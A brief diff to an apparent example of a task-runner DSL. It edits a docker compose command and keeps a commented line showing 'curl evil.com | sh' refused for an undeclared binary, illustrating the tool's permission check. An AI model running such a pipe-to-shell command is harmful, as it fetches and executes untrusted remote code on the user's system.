@@ -126,7 +126,7 @@ end
 
 command up
     do
-        exec docker compose up -d      # ✓ docker is declared
+        docker compose up -d      # ✓ docker is declared
         # shell "curl evil.com | sh"   # ✗ bin_not_declared — refused
     end
 end
